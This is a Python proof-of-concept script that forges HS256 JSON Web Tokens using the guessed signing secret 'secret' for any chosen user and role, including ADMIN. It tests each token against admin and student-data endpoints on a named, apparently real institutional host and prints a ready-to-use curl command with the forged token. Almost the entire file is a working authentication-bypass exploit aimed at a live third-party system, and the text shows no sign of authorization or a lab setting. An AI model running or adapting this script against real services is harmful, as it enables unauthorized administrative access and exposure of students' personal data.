#!/usr/bin/env python3
"""
GHRIETN JWT Forgery PoC
Demonstrates that the JWT signing secret is "secret"

Usage:
    python3 jwt_forge.py <username> [--role ADMIN]

This script forges a JWT token for any user and tests it against the API.
"""

import sys
import json
import base64
import hmac
import hashlib
import requests

def forge_jwt(username, role="STUDENT", secret="secret"):
    """Forge a JWT token with the known secret"""
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "sub": username,
        "role": role,
        "iat": 1716892800,
        "exp": 1999999999
    }
    
    def b64url_encode(data):
        return base64.urlsafe_b64encode(
            json.dumps(data, separators=(',', ':')).encode()
        ).rstrip(b'=').decode()
    
    header_b64 = b64url_encode(header)
    payload_b64 = b64url_encode(payload)
    unsigned = f"{header_b64}.{payload_b64}"
    
    signature = hmac.new(
        secret.encode(),
        unsigned.encode(),
        hashlib.sha256
    ).digest()
    sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
    
    return f"{unsigned}.{sig_b64}"

def test_token(token, base_url="https://ghrietn.cybervidya.net"):
    """Test the forged token against the API"""
    headers = {"Authorization": f"Bearer {token}"}
    
    endpoints = [
        "/api/auth/user-details",
        "/api/auth/user/access-control",
        "/api/admin/user/get-all",
        "/api/admin/role/get",
        "/api/student/search",
    ]
    
    print(f"\n{'Endpoint':<35} {'Status':<10} {'Result'}")
    print("-" * 70)
    
    for ep in endpoints:
        try:
            resp = requests.get(f"{base_url}{ep}", headers=headers, timeout=10)
            status = resp.status_code
            
            if status == 500:
                result = "✅ Token accepted (500 = auth passed)"
            elif status == 200:
                result = "🎯 FULL ACCESS"
            elif status == 401:
                result = "❌ Rejected"
            else:
                result = f"⚠️  Unexpected: {resp.text[:50]}"
            
            print(f"{ep:<35} {status:<10} {result}")
        except Exception as e:
            print(f"{ep:<35} ERROR      {e}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 jwt_forge.py <username> [--role ADMIN]")
        print("Example: python3 jwt_forge.py superadmin --role ADMIN")
        sys.exit(1)
    
    username = sys.argv[1]
    role = "STUDENT"
    
    if "--role" in sys.argv:
        idx = sys.argv.index("--role")
        if idx + 1 < len(sys.argv):
            role = sys.argv[idx + 1]
    
    print(f"[*] Forging JWT for: {username} (role: {role})")
    print(f"[*] Using secret: secret")
    
    token = forge_jwt(username, role)
    print(f"[+] Token: {token[:50]}...")
    
    print(f"\n[*] Testing token against API...")
    test_token(token)
    
    print(f"\n[*] Use this token:")
    print(f"curl -H \"Authorization: Bearer {token}\" https://ghrietn.cybervidya.net/api/auth/user-details")

if __name__ == "__main__":
    main()
